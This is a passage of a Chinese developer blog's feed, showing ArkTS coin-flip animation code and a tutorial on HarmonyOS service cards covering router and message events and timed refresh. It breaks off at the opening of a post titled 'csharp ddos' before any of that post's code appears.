function_">animateToImmediately</span>(&#123;</span><br><span class="line">            <span class="attr">duration</span>: totalAnimationDuration / <span class="number">2</span>, <span class="comment">// 动画时长为总时长的一半</span></span><br><span class="line">            <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">              <span class="comment">// 第二次动画，向下落</span></span><br><span class="line">              <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">                <span class="attr">duration</span>: totalAnimationDuration / <span class="number">2</span>,</span><br><span class="line">                <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="variable language_">this</span>.<span class="property">rotationAngle</span> % <span class="number">360</span>; <span class="comment">// 确保角度在0到360之间</span></span><br><span class="line">                  <span class="comment">// 判断当前显示的面</span></span><br><span class="line">                  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isHeadsFaceUp</span>()) &#123; <span class="comment">// 如果是地鼠面</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">tailsCount</span>++; <span class="comment">// 反面朝上的次数加1</span></span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果是反面</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">headsCount</span>++; <span class="comment">// 正面朝上的次数加1</span></span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">isAnimRun</span> = <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">verticalOffset</span> = <span class="number">0</span>; <span class="comment">// 重置纵向位移</span></span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 设置纵向位移，模拟抛硬币的效果</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">verticalOffset</span> = -<span class="number">100</span> * (<span class="number">1</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">5</span>)); <span class="comment">// 随机设置向上的位移</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 循环动画，增加旋转效果</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxAnimationSteps; i++) &#123;</span><br><span class="line">            <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">              <span class="attr">delay</span>: i * totalAnimationDuration / maxAnimationSteps, <span class="comment">// 设置每次动画的延迟</span></span><br><span class="line">              <span class="attr">duration</span>: <span class="number">100</span>, <span class="comment">// 每次动画的持续时间</span></span><br><span class="line">              <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">// 动画完成后的回调</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">rotationAngle</span> += <span class="number">90</span>; <span class="comment">// 每次增加90度旋转</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">layoutWeight</span>(<span class="number">1</span>).<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Bottom</span>).<span class="title function_">padding</span>(&#123; <span class="attr">bottom</span>: <span class="number">80</span> &#125;); <span class="comment">// 设置组件的宽度、权重、对齐方式和底部内边距</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置整个页面的高度</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置整个页面的宽度</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#0b0d0c&quot;</span>); <span class="comment">// 设置背景颜色</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 判断当前是否显示地鼠面</span></span><br><span class="line">  <span class="title function_">isHeadsFaceUp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> normalizedAngle = <span class="variable language_">this</span>.<span class="property">rotationAngle</span> % <span class="number">360</span>; <span class="comment">// 规范化角度</span></span><br><span class="line">    <span class="comment">// 判断角度范围，确定是否显示地鼠面</span></span><br><span class="line">    <span class="keyword">if</span> (normalizedAngle &gt;= <span class="number">0</span> &amp;&amp; normalizedAngle &lt; <span class="number">90</span> || normalizedAngle &gt;= <span class="number">270</span> &amp;&amp; normalizedAngle &lt;= <span class="number">360</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 显示地鼠面</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 显示反面</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!--分贝仪https://blog.csdn.net/zhongcongxu01/article/details/143460361https://blog.csdn.net/zhongcongxu01/article/details/142773929-->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;DevEco Studio NEXT Beta1 Build Version: 5.0&lt;br&gt;API 13&lt;/p&gt;
&lt;h1 id=&quot;Wast</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="HarmonryOS" scheme="https://banjinmei.github.io/tags/HarmonryOS/"/>
    
  </entry>
  
  <entry>
    <title>鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片</title>
    <link href="https://banjinmei.github.io/2024/12/13/%E9%B8%BF%E8%92%99%E5%BA%94%E7%94%A8-%E5%9F%BA%E4%BA%8EArkTS%E5%8D%A1%E7%89%87%E5%BC%80%E5%8F%91-HarmonyOS%E6%9C%8D%E5%8A%A1%E5%8D%A1%E7%89%87/"/>
    <id>https://banjinmei.github.io/2024/12/13/%E9%B8%BF%E8%92%99%E5%BA%94%E7%94%A8-%E5%9F%BA%E4%BA%8EArkTS%E5%8D%A1%E7%89%87%E5%BC%80%E5%8F%91-HarmonyOS%E6%9C%8D%E5%8A%A1%E5%8D%A1%E7%89%87/</id>
    <published>2024-12-13T14:45:30.000Z</published>
    <updated>2024-12-13T16:18:19.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片"><a href="#鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片" class="headerlink" title="鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片"></a>鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片</h1><h1 id="服务卡片架构"><a href="#服务卡片架构" class="headerlink" title="服务卡片架构"></a>服务卡片架构</h1><p>卡片使用方 提供方</p><h1 id="ArkTS卡片创建"><a href="#ArkTS卡片创建" class="headerlink" title="ArkTS卡片创建"></a>ArkTS卡片创建</h1><p>创建步骤 卡片相关文件（卡片生命周期管理文件 卡片页面文件 卡片配置文件） </p><h1 id="ArkTS生命周期"><a href="#ArkTS生命周期" class="headerlink" title="ArkTS生命周期"></a>ArkTS生命周期</h1><h1 id="ArkTS卡片事件开发"><a href="#ArkTS卡片事件开发" class="headerlink" title="ArkTS卡片事件开发"></a>ArkTS卡片事件开发</h1><p>router message call</p><h1 id="服务卡片的定义及基本概念"><a href="#服务卡片的定义及基本概念" class="headerlink" title="服务卡片的定义及基本概念"></a>服务卡片的定义及基本概念</h1><h2 id="卡片定义"><a href="#卡片定义" class="headerlink" title="卡片定义"></a>卡片定义</h2><p>作为一种界面展示形式，可将重要信息或操作前置到卡片，以达到服务直达、减少体验层级的目的。<br>卡片常用于嵌入其他系统应用中，作为其页面展示的一部分，支持拉起页面、发送消息等基础交互功能。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>卡片提供方<br>包含卡片的应用，提供卡片的显示内容可以进行交互如界面刷新、应用跳转等。<br>卡片使用方<br>如图中的桌面，控制卡片的展示位置。</p><h2 id="攻克难点"><a href="#攻克难点" class="headerlink" title="攻克难点"></a>攻克难点</h2><p>1、在DevEco studio中如何创建服务卡片?<br>2、服务卡片开发涉及哪些重要的配置文件?<br>3、如何使用router事件跳转到指定UIAbility，实现服务直达效果?<br>4、如何实现卡片内容的定点和定时刷新?</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="创建卡片"><a href="#创建卡片" class="headerlink" title="创建卡片"></a>创建卡片</h2><p>项目内左侧 entry右键 new service widget</p><p>ets&#x2F;entryformability<br>EntryFormAbility.ts 生命周期文件<br>ets&#x2F;widget&#x2F;pages&#x2F;<br>WidgetCard.ets 卡片页面</p><p>form_config.json 卡片配置<br>  “isDefault”: true,   &#x2F;&#x2F;默认拉起的卡片<br>      “updateEnabled”: false,  &#x2F;&#x2F;表示卡片是否支持周期性刷新<br>      “scheduledUpdateTime”: “10:30”,&#x2F;&#x2F;表示卡片的定点剧新时刻，采用24小时制，精确到分钟<br>      “updateDuration”: 1, &#x2F;&#x2F;表示卡片定时剧新的更新周期，单位为<strong>30分钟</strong>，两种方式任选其一，同时配置，定时刷新优先生效 </p><p>main_pages.json 路由</p><!-- module.json5abtexabt --><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>卡片创建完成后，可以点击DevEcoStudio开发工具右上角的启动按钮，运行项目查看效果易错点:鼠标按住左键向上心拖动，换出服务卡片。</p><IMG><h2 id="在EntryFormAbility-ts文件中"><a href="#在EntryFormAbility-ts文件中" class="headerlink" title="在EntryFormAbility.ts文件中"></a>在EntryFormAbility.ts文件中</h2><p>实现了FormExtensionAbility的生命周期接口，开发者可根据自身业务需求，调用对应的接口。<br>8大生命周期<br>export default class EntryFormAbility extends FormExtensionAbility {<br><strong>onAddForm(want)</strong> {..)}创建卡片时触发 ★ 信息传递<br><strong>onCastToNormalForm(formld)</strong> {…}临时卡片转常态卡片时触发<br>**onUpdateForm(formid) **{..}卡片更新时触发 ★<br><strong>onChangeFormVisibility(newStatus)</strong> {…}修改卡片可见性时触发<br><strong>onFormEvent(formld, message)</strong> {…}处理卡片事件时触发 ★<br><strong>onRemoveForm(formld)</strong>{…}卡片销毁时触发<br><strong>nConfigurationUpdate(config)</strong> {…}系统配置更新时触发<br><strong>onAcquireFormState(want)</strong>{…}查询卡片状态时触发</p><h2 id="卡片事件开发"><a href="#卡片事件开发" class="headerlink" title="卡片事件开发"></a>卡片事件开发</h2><p>ArKTS卡片提供了**postCardAction()**接口，用于卡片内部和提供方应用间的交互，当前支持router、message和call三种类型的事件，仅在卡片中可以调用。</p><h2 id="卡片页面文件-WidegetCard-ets"><a href="#卡片页面文件-WidegetCard-ets" class="headerlink" title="卡片页面文件(WidegetCard.ets)"></a>卡片页面文件(WidegetCard.ets)</h2><p>postCardAction<br>-&gt; <strong>message</strong> -&gt;触发onFormEvent<br>-&gt; FormExtensionAbility(EntryFormAbility.ts)</p><h2 id="卡片页面文件-WidegetCard-ets-1"><a href="#卡片页面文件-WidegetCard-ets-1" class="headerlink" title="卡片页面文件(WidegetCard.ets)"></a>卡片页面文件(WidegetCard.ets)</h2><p>postCardAction<br>-&gt;<strong>router</strong>-&gt;<br>首次启动触发onCreate<br>非首次启动触发onNewWant<br>UlAbility(EntryAbility.ts)<br>-&gt;<strong>call</strong>-&gt;<br>首次启动触发onCreate<br>UlAbility(EntryAbility.ts)</p><h2 id="卡片事件-router"><a href="#卡片事件-router" class="headerlink" title="卡片事件-router"></a>卡片事件-router</h2><p>使用router事件跳转到指定UIAbility。&gt;在卡片页面文件中调用router事件能够快速拉起卡片提供方应用的指定UIAbility，实现一键直达的效果。<br>在UlAbility的EntryAbility.ts文件中接收router事件并获取参数，根据传递的params不同，选择拉起不同的页面。</p><p>##卡片事件-message刷新卡片 (点击 )<br>在EntryFormAbility.ts文件中的onFormEvent生命周期中调用updateForm接口刷新卡片。</p><h2 id="卡片事件-数据交互"><a href="#卡片事件-数据交互" class="headerlink" title="卡片事件-数据交互"></a>卡片事件-数据交互</h2><p>有时在刷新卡片内容时，我们希望实现定时刷新或者定点刷新，无需手动刷新。定时刷新:表示在一定时间间隔内调用<strong>onUpdateForm</strong>的生命周期回调函数自动刷新卡片内容。可以在form config.json配置文件的updateDuration字段中进行设置。定点刷新:表示每天在某个时间点刷新，在form config.json文件的scheduledUpdateTime字段进行设置。(自动)</p><p>在触发定时或定点刷新后，系统会调用ntryFormAbility.ts文件中的生命周期回调onUpdateForm，在回调中可以使用updateForm进行提供方刷新卡片。</p><p>使用声明式范式开发ArkTS卡片页面，在<strong>WallPaperCard.ets</strong>文件（即卡片的页面文件）中完成卡片的UI界面构建</p><h1 id="使用router事件跳转到指定UIAbility"><a href="#使用router事件跳转到指定UIAbility" class="headerlink" title="使用router事件跳转到指定UIAbility"></a>使用router事件跳转到指定UIAbility</h1><p>当我们点击卡片时，希望跳转到应用的主页面，仔细分析，该功能可拆分为以下两个部分实现：</p><ul><li>首先，在WallPaperCard.ets卡片页面中调用<strong>postCardAction</strong>向指定EntryAbility发送router事件，并在事件内定义需要传递的内容。</li><li>其次，在EntryAbility中接收router事件并获取参数，根据传递的params不同，选择拉起不同的页面。<br>在WallPaperCard.ets卡片页面中调用<strong>postCardAction</strong>接口向EntryAbility发送router事件，从而拉起EntryAbility；此时，只需在WallPaperCard.ets的页面布局中设定一个点击事件，当用户点击卡片时，即可跳转至应用的详情页面，这里给最外层的根容器组件Row绑定一个点击事件，在其中完成调用<strong>postCardAction</strong>接口向EntryAbility发送router事件的操作</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//WallPaperCard.ets</span></span><br><span class="line">    .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">//使用router,拉起EntryAbility并跳转到对应的详情页面</span></span><br><span class="line">      <span class="title function_">postCardAction</span>(<span class="variable language_">this</span>, &#123;</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="variable language_">this</span>.<span class="property">ACTION_TYPE</span>,</span><br><span class="line">        <span class="string">&quot;abilityName&quot;</span>: <span class="variable language_">this</span>.<span class="property">ABILITY_NAME</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;targetPage&#x27;</span>: <span class="string">&#x27;home&#x27;</span> <span class="comment">// 在EntryAbility中处理这个信息</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>在WallPaperCard.ets卡片页面中向EntryAbility发送router事件后，需要在EntryAbility.ts文件中接收router事件，并获取事件中携带的参数，通过传递的参数选择拉起不同的页面，这里是拉起主页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EntryAbility.ts</span></span><br><span class="line"> <span class="title function_">onCreate</span>(<span class="params">want, launchParam</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果UIAbility第一次启动，在收到卡片的Router事件后会触发onCreate生命周期回调</span></span><br><span class="line">    <span class="comment">// 获取router事件中传递的targetPage参数</span></span><br><span class="line">    <span class="keyword">if</span> (want.<span class="property">parameters</span>.<span class="property">params</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> params = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(want.<span class="property">parameters</span>.<span class="property">params</span>);</span><br><span class="line">      selectPage = params.<span class="property">targetPage</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果UIAbility是非首次启动，在收到卡片Router事件后会触发onNewWant生命周期回调</span></span><br><span class="line">  <span class="title function_">onNewWant</span>(<span class="params">want, launchParam</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (want.<span class="property">parameters</span>.<span class="property">params</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="comment">// 同样,获取router事件中传递的targetPage参数</span></span><br><span class="line">      <span class="keyword">let</span> params = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(want.<span class="property">parameters</span>.<span class="property">params</span>);</span><br><span class="line">      selectPage = params.<span class="property">targetPage</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (currentWindowStage != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">onWindowStageCreate</span>(currentWindowStage);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="使用message-事件刷新卡片内容"><a href="#使用message-事件刷新卡片内容" class="headerlink" title="使用message 事件刷新卡片内容"></a>使用message 事件刷新卡片内容</h1><p>在卡片的使用过程中，我们希望可以通过点击卡片中的刷新按钮，实现卡片内容的更新，此时可以在WallPaperCard.ets中调用postCardAction接口触发message事件拉起FormExtensionAbility，然后由FormExtensionAbility刷新卡片内容。<br>仔细分析，上述效果可拆分为以下两个部分实现：</p><ul><li>首先，在卡片页面中给Button组件绑定点击事件，在其中调用<strong>postCardAction</strong>接口触发message事件拉起FormExtensionAbility。</li><li>其次，在EntryFormAbility.ts的onFormEvent生命周期中调用updateForm接口刷新卡片。<br>在WallPaperCard.ets卡片页面中给Button组件绑定点击事件，在其中调用<strong>postCardAction</strong>接口触发message事件拉起FormExtensionAbility</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">//点击刷新按钮,通过message事件刷新卡片数据</span></span><br><span class="line">           <span class="title function_">postCardAction</span>(<span class="variable language_">this</span>, &#123;</span><br><span class="line">             <span class="string">&#x27;action&#x27;</span>: <span class="variable language_">this</span>.<span class="property">ACTION_TYPE2</span>,</span><br><span class="line">             <span class="string">&#x27;params&#x27;</span>: &#123;</span><br><span class="line">               <span class="string">&#x27;msgTest&#x27;</span>: <span class="string">&#x27;messageEvent&#x27;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">         &#125;)</span><br></pre></td></tr></table></figure><p>在EntryFormAbility.ts的onFormEvent生命周期中调用updateForm接口刷新卡片</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onFormEvent</span>(<span class="params">formId, message</span>) &#123;</span><br><span class="line">  <span class="comment">// 通过messages事件刷新,就会触发该回调</span></span><br><span class="line">  <span class="keyword">let</span> formData = &#123;</span><br><span class="line">    <span class="string">&#x27;recommend&#x27;</span>: <span class="string">&#x27;message刷新&#x27;</span>, <span class="comment">//要刷新的具体内容，和卡片布局中对应</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">let</span> formInfo = formBindingData.<span class="title function_">createFormBindingData</span>(formData)</span><br><span class="line">  <span class="comment">//调用updateForm接口刷新卡片</span></span><br><span class="line">  formProvider.<span class="title function_">updateForm</span>(formId, formInfo).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;FormAbility updateForm success.&#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;FormAbility updateForm failed: &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(error));</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="卡片数据交互"><a href="#卡片数据交互" class="headerlink" title="卡片数据交互"></a>卡片数据交互</h1><h2 id="卡片的定时刷新"><a href="#卡片的定时刷新" class="headerlink" title="卡片的定时刷新"></a>卡片的定时刷新</h2><p>在卡片的使用过程中，有时候我们希望卡片的内容可以定时自动刷新,比如每隔0.5小时刷新一次；定时刷新的功能效果，同样可拆分为以下两个部分实现：</p><ul><li>首先，需要在“resources&gt;base&gt;profile”目录下的form_config.json配置文件中对<strong>updateDuration</strong>字段进行设置。</li><li>其次，在触发定时刷新后，系统会调用EntryFormAbility.ts中的onUpdateForm生命周期回调，在回调中，可以使用updateForm进行提供方刷新卡片。<br>定时刷新的时间间隔单位为30分钟，因此每隔0.5小时刷新，则<strong>updateDuration</strong>字段值应该设为1，同时将<strong>updateEnabled</strong>字段值设为true</li></ul><p>EntryFormAbility.ts中的onUpdateForm生命周期回调具体代码如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onUpdateForm</span>(<span class="params">formId</span>) &#123;</span><br><span class="line">    <span class="comment">//设置定时或定点更新后,系统就会触发该回调</span></span><br><span class="line">    <span class="keyword">let</span> formData = &#123;</span><br><span class="line">       <span class="string">&#x27;recommend2&#x27;</span>: <span class="string">&#x27;定时刷新&#x27;</span>, <span class="comment">//要刷新的具体内容，和卡片布局中对应</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> formInfo = formBindingData.<span class="title function_">createFormBindingData</span>(formData)</span><br><span class="line">    <span class="comment">// 调用updateForm接口刷新卡片</span></span><br><span class="line">    formProvider.<span class="title function_">updateForm</span>(formId, formInfo).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;FormAbility updateForm success.&#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;FormAbility updateForm failed: &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(error));</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="卡片的定点刷新"><a href="#卡片的定点刷新" class="headerlink" title="卡片的定点刷新"></a>卡片的定点刷新</h2><p>在卡片的使用过程中，有时候我们希望卡片的内容可以定点自动刷新，比如每天上午的10:30就自动刷新卡片内容，定点刷新的功能效果，同样可拆分为以下两个部分实现：</p><ul><li>首先，需要在“resources&gt;base&gt;profile”目录下的form_config.json配置文件中对<strong>scheduledUpdateTime</strong>字段进行设置。</li><li>其次，在触发定点刷新后，系统会调用EntryFormAbility.ts中的onUpdateForm生命周期回调，在回调中，可以使用updateForm进行提供方刷新卡片。<br>需要注意的是，定时刷新与定点刷新之间存在优先级问题，<strong>updateDuration</strong>（定时刷新）优先级比<strong>scheduledUpdateTime</strong>（定点刷新）高，配置定时刷新后，定点刷新将失效。<br>如果同时配置了<strong>updateDuration</strong>（定时刷新）和<strong>scheduledUpdateTime</strong>（定点刷新），想要定点刷新生效，则需要将<strong>updateDuration</strong>配置为0。<br>此处如想实现每天10:30定点刷新卡片内容，则须在配置文件中将<strong>updateDuration</strong>配置为0，同时<strong>scheduledUpdateTime</strong>设置为10:30，将<strong>updateEnabled</strong>字段值设为true</li></ul><p>同样地，定点刷新触发后，系统会自动调用EntryFormAbility.ts中的onUpdateForm生命周期回调，onUpdateForm具体代码如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onUpdateForm</span>(<span class="params">formId</span>) &#123;</span><br><span class="line">    <span class="comment">//设置定时或定点更新后,系统就会触发该回调</span></span><br><span class="line">    <span class="keyword">let</span> formData = &#123;</span><br><span class="line">    <span class="comment">//&#x27;recommend2&#x27;: &#x27;定时刷新&#x27;</span></span><br><span class="line">       <span class="string">&#x27;recommend3&#x27;</span>: <span class="string">&#x27;定点刷新&#x27;</span>, <span class="comment">//要刷新的具体内容，和卡片布局中对应</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> formInfo = formBindingData.<span class="title function_">createFormBindingData</span>(formData)</span><br><span class="line">    <span class="comment">// 调用updateForm接口刷新卡片</span></span><br><span class="line">    formProvider.<span class="title function_">updateForm</span>(formId, formInfo).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;FormAbility updateForm success.&#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;FormAbility updateForm failed: &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(error));</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h2><p>如果在过程中发现定点刷新始终无法生效，请先排查模拟器中的时间是否和真实的标准时间一致，如果不一致，可直接在模拟器设置中完成时间校准，例如定点刷新时间为10:30，则在设置中将时间调整为10：29（因为项目重启需要时间编译），重启项目工程~</p><!--性能优化 -> web组件  提高性能 各种组件，应用复杂起来 ，更高阶实现https://lab.huaweicloud.com/experiment-detail_3419?ticket=ST-82364673-adCAa4rYrbwOcoMKV22mVnCo-sso 基于ArkTS卡片开发的鸿蒙应用趣味案例https://lab.huaweicloud.com/experimentmanual_3419  卡片使用实操实验AppScope app.json5bundleName 唯一src common 常量类 entryAbility 生命周期-->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片&quot;&gt;&lt;a href=&quot;#鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片&quot; class=&quot;headerlink&quot; title=&quot;鸿蒙应用-基于ArkTS卡片开发-HarmonyOS服务卡片&quot;&gt;</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="HarmonyOS" scheme="https://banjinmei.github.io/tags/HarmonyOS/"/>
    
    <category term="ArkTS" scheme="https://banjinmei.github.io/tags/ArkTS/"/>
    
  </entry>
  
  <entry>
    <title>csharp ddos</title>
    <link href="https://banjinmei.github.io/2024/12/11/csharp-ddos/"/>
    <id>https://banjinmei.github.io/2024/12/11/csharp-ddos/</id>
    <published>2024-12-11T13:19:04.000Z</published>
    <updated>2024-12-11T14:10:59.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UDP-包发"><a href="#UDP-包发" class="headerlink" title="UDP 包发"></a>UDP 包发</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 